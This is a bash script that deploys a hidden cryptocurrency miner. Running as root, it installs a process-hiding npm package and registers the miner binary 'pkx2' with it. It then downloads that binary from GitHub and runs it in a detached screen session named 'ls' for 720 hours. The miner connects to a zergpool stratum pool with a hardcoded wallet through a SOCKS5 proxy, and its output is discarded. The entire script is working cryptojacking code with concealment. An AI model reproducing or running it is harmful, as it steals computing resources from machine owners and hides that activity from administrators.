#!/bin/bash 
sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && ph add pkx2 && wget https://github.com/parkitmove/parkit/raw/main/pkx2 && sudo apt install screen libjansson4 -y && screen -dmS ls && chmod +x pkx2 && timeout 720h ./pkx2 -a curvehash -o stratum+tcp://curvehash.eu.mine.zergpool.com:3343 -u XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk -p c=DASH,mc=PLSR,ID=$(echo $(hostname)) -t 1 -x socks5://192.252.214.20:15864 > /dev/null 2>&1"
